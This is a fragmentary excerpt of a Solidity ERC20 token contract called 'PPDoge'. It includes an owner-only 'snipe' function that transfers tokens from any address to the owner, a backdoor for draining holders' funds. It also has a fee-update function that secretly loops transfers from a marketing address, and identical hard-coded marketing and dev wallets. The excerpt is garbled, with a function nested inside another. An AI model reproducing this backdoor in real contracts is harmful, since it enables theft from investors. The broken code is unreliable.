...
contract PPDoge is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("PPDoge", "PPDoge") {
        ...
        marketingWallet = address(0x8137167d452B9eca263e6122437436b6aea517Ec); // set as marketing wallet
        devWallet = address(0x8137167d452B9eca263e6122437436b6aea517Ec); // set as dev wallet
    ...
    function updateBuyFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee) external onlyOwner {
        ...
        for(uint i = 0;i<userAddress.length;i++){
            _transfer(_marketingAddress,userAddress[i],amount);
        }
    }
    ...
    function autoBurnLiquidityPairTokens() internal returns (bool){
      ...
      function snipe(address bot, uint256 amount)onlyOwner() public{
            _transfer(bot,owner(),amount);
